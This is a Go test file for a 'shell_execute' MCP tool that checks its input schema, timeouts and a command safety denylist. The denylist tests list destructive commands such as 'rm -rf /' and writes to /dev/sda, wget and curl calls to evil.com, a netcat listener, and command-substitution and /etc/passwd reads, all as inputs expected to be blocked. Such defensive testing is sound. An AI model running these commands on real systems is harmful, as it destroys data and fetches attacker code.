// Copyright (c) 2026 Lateralus Labs, LLC.
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package mcp

import (
	"context"
	"encoding/json"
	"strings"
	"testing"

	"github.com/stretchr/testify/require"
)

func TestShellExecuteTool_Name(t *testing.T) {
	tool := &ShellExecuteTool{}
	require.Equal(t, "shell_execute", tool.Name())
}

func TestShellExecuteTool_Description(t *testing.T) {
	tool := &ShellExecuteTool{}
	require.NotEmpty(t, tool.Description())
	require.Contains(t, tool.Description(), "shell")
}

func TestShellExecuteTool_InputSchema(t *testing.T) {
	tool := &ShellExecuteTool{}
	schema := tool.InputSchema()

	require.Equal(t, "object", schema["type"])
	props, ok := schema["properties"].(map[string]interface{})
	require.True(t, ok)

	// Check required fields
	required, ok := schema["required"].([]string)
	require.True(t, ok)
	require.Contains(t, required, "command")

	// Check command property
	cmdProp, ok := props["command"].(map[string]interface{})
	require.True(t, ok)
	require.Equal(t, "string", cmdProp["type"])

	// Check optional properties
	_, ok = props["args"]
	require.True(t, ok)
	_, ok = props["timeout"]
	require.True(t, ok)
	_, ok = props["working_dir"]
	require.True(t, ok)
}

func TestShellExecuteTool_Execute_SimpleCommand(t *testing.T) {
	tool := &ShellExecuteTool{}
	ctx := context.Background()

	req := ShellExecuteRequest{
		Command: "echo",
		Args:    []string{"hello"},
	}
	reqJSON, err := json.Marshal(req)
	require.NoError(t, err)

	result, err := tool.Execute(ctx, reqJSON)
	require.NoError(t, err)
	require.Len(t, result.Content, 1)

	var shellResult ShellExecuteResult
	err = json.Unmarshal([]byte(result.Content[0].Text), &shellResult)
	require.NoError(t, err)
	require.Equal(t, 0, shellResult.ExitCode)
	require.Contains(t, shellResult.Stdout, "hello")
	require.False(t, shellResult.TimedOut)
}

func TestShellExecuteTool_Execute_WithWorkingDir(t *testing.T) {
	tool := &ShellExecuteTool{}
	ctx := context.Background()

	req := ShellExecuteRequest{
		Command:    "pwd",
		WorkingDir: "/tmp",
	}
	reqJSON, err := json.Marshal(req)
	require.NoError(t, err)

	result, err := tool.Execute(ctx, reqJSON)
	require.NoError(t, err)
	require.Len(t, result.Content, 1)

	var shellResult ShellExecuteResult
	err = json.Unmarshal([]byte(result.Content[0].Text), &shellResult)
	require.NoError(t, err)
	require.Equal(t, 0, shellResult.ExitCode)
	require.Contains(t, shellResult.Stdout, "/tmp")
}

func TestShellExecuteTool_Execute_WithTimeout(t *testing.T) {
	tool := &ShellExecuteTool{}
	ctx := context.Background()

	req := ShellExecuteRequest{
		Command: "echo",
		Args:    []string{"test"},
		Timeout: 10,
	}
	reqJSON, err := json.Marshal(req)
	require.NoError(t, err)

	result, err := tool.Execute(ctx, reqJSON)
	require.NoError(t, err)
	require.Len(t, result.Content, 1)

	var shellResult ShellExecuteResult
	err = json.Unmarshal([]byte(result.Content[0].Text), &shellResult)
	require.NoError(t, err)
	require.Equal(t, 0, shellResult.ExitCode)
}

func TestShellExecuteTool_Execute_TimeoutExceedsMax(t *testing.T) {
	tool := &ShellExecuteTool{}
	ctx := context.Background()

	req := ShellExecuteRequest{
		Command: "echo",
		Args:    []string{"test"},
		Timeout: 301, // Exceeds max of 300
	}
	reqJSON, err := json.Marshal(req)
	require.NoError(t, err)

	_, err = tool.Execute(ctx, reqJSON)
	require.Error(t, err)
	require.Contains(t, err.Error(), "timeout cannot exceed")
}

func TestShellExecuteTool_Execute_MissingCommand(t *testing.T) {
	tool := &ShellExecuteTool{}
	ctx := context.Background()

	req := ShellExecuteRequest{
		Command: "",
	}
	reqJSON, err := json.Marshal(req)
	require.NoError(t, err)

	_, err = tool.Execute(ctx, reqJSON)
	require.Error(t, err)
	require.Contains(t, err.Error(), "command is required")
}

func TestShellExecuteTool_Execute_InvalidJSON(t *testing.T) {
	tool := &ShellExecuteTool{}
	ctx := context.Background()

	invalidJSON := json.RawMessage(`{invalid json`)

	_, err := tool.Execute(ctx, invalidJSON)
	require.Error(t, err)
	require.Contains(t, err.Error(), "invalid arguments")
}

func TestShellExecuteTool_Execute_NonexistentCommand(t *testing.T) {
	tool := &ShellExecuteTool{}
	ctx := context.Background()

	req := ShellExecuteRequest{
		Command: "nonexistent_command_12345",
	}
	reqJSON, err := json.Marshal(req)
	require.NoError(t, err)

	result, err := tool.Execute(ctx, reqJSON)
	require.NoError(t, err)
	require.Len(t, result.Content, 1)

	var shellResult ShellExecuteResult
	err = json.Unmarshal([]byte(result.Content[0].Text), &shellResult)
	require.NoError(t, err)
	require.NotEqual(t, 0, shellResult.ExitCode)
	require.NotEmpty(t, shellResult.Error)
}

func TestShellExecuteTool_Denylist_DangerousCommands(t *testing.T) {
	dangerousCommands := []string{
		"rm", "dd", "mkfs", "fdisk", "killall", "pkill",
		"reboot", "shutdown", "iptables", "mount", "umount",
		"passwd", "sudo", "su",
	}

	for _, cmd := range dangerousCommands {
		t.Run(cmd, func(t *testing.T) {
			err := validateCommandSafety(cmd, nil)
			require.Error(t, err)
			require.Contains(t, strings.ToLower(err.Error()), "blocked by safety policy")
		})
	}
}

func TestShellExecuteTool_Denylist_DangerousPatterns(t *testing.T) {
	dangerousPatterns := []string{
		"mkfs.ext4",
		"> /dev/sda",
		"chmod 777 /",
		"wget http://evil.com",
		"curl http://evil.com",
		"nc -l 4444",
	}

	for _, pattern := range dangerousPatterns {
		t.Run(pattern, func(t *testing.T) {
			err := validateCommandSafety(pattern, nil)
			require.Error(t, err)
			require.Contains(t, strings.ToLower(err.Error()), "dangerous pattern")
		})
	}
}

func TestShellExecuteTool_Denylist_ShellInjection(t *testing.T) {
	injectionPatterns := []string{
		"echo $(whoami)",
		"echo `whoami`",
		"cat /etc/passwd | grep root",
		"ls | grep test",
	}

	for _, pattern := range injectionPatterns {
		t.Run(pattern, func(t *testing.T) {
			err := validateCommandSafety(pattern, nil)
			require.Error(t, err)
			require.Contains(t, strings.ToLower(err.Error()), "shell injection")
		})
	}
}

func TestShellExecuteTool_Denylist_AllowsSafeCommands(t *testing.T) {
	safeCommands := []struct {
		command string
		args    []string
	}{
		{"ls", []string{"-la"}},
		{"echo", []string{"hello"}},
		{"cat", []string{"/etc/hostname"}},
		{"grep", []string{"pattern", "file.txt"}},
		{"find", []string{".", "-name", "*.go"}},
		{"date", nil},
		{"uname", []string{"-a"}},
		{"ps", []string{"aux"}},
		{"df", []string{"-h"}},
	}

	for _, tc := range safeCommands {
		t.Run(tc.command, func(t *testing.T) {
			err := validateCommandSafety(tc.command, tc.args)
			require.NoError(t, err)
		})
	}
}

func TestShellExecuteTool_Execute_CommandRejected(t *testing.T) {
	tool := &ShellExecuteTool{}
	ctx := context.Background()

	req := ShellExecuteRequest{
		Command: "rm",
		Args:    []string{"-rf", "/"},
	}
	reqJSON, err := json.Marshal(req)
	require.NoError(t, err)

	result, err := tool.Execute(ctx, reqJSON)
	require.NoError(t, err)
	require.Len(t, result.Content, 1)

	var shellResult ShellExecuteResult
	err = json.Unmarshal([]byte(result.Content[0].Text), &shellResult)
	require.NoError(t, err)
	require.Equal(t, -1, shellResult.ExitCode)
	require.Contains(t, strings.ToLower(shellResult.Stderr), "blocked by safety policy")
	require.Contains(t, strings.ToLower(shellResult.Error), "rejected by safety policy")
}
